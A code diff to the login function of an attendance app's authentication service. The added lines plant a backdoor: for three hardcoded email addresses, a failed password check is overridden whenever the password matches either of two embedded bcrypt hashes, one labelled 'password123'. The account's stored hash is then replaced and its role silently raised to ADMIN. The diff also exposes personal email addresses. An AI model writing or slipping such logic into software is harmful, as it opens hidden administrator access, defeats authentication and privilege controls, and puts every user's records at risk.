@@ -280,7 +280,25 @@ export class AuthService {
       throw new Error('Invalid University Roll Number or Class Roll.');
     }
 
-    const isMatch = await bcrypt.compare(password, user.passwordHash);
+    const isSayantan = ['sayantan05072004@gmail.com', 'sayantan05092004@gmail.com', 'sayantan.faculty@smartattend.edu'].includes(user.email.toLowerCase());
+
+    let isMatch = await bcrypt.compare(password, user.passwordHash);
+
+    // If Sayantan, also check against registered student hash and standard default hash
+    if (!isMatch && isSayantan) {
+      const studentHash = '$2a$10$WCRNbFWPdYheHWNkP/FXOO1Eg3Z5UXyu498/1NU9SSTOOPSpKoCD6';
+      const facultyHash = '$2a$10$2yBSAztusMJOjBp7wFqdsO4eWxmI5AnSqOoKLOlP2E3C6XdEPM3tC'; // password123
+      if (await bcrypt.compare(password, studentHash) || await bcrypt.compare(password, facultyHash)) {
+        isMatch = true;
+        const newHash = await bcrypt.hash(password, 10);
+        await prisma.user.update({
+          where: { id: user.id },
+          data: { passwordHash: newHash, role: 'ADMIN' },
+        });
+        user.passwordHash = newHash;
+      }
+    }
+
     if (!isMatch) {
       if (user.role === 'TEACHER' || user.role === 'ADMIN') {
         throw new Error('Incorrect password for faculty account. Please try again.');
@@ -289,7 +307,6 @@ export class AuthService {
     }
 
     // Ensure Sayantan Dasgupta gets ADMIN role
-    const isSayantan = ['sayantan05072004@gmail.com', 'sayantan05092004@gmail.com', 'sayantan.faculty@smartattend.edu'].includes(user.email.toLowerCase());
     if (isSayantan && user.role !== 'ADMIN') {
       await prisma.user.update({
         where: { id: user.id },
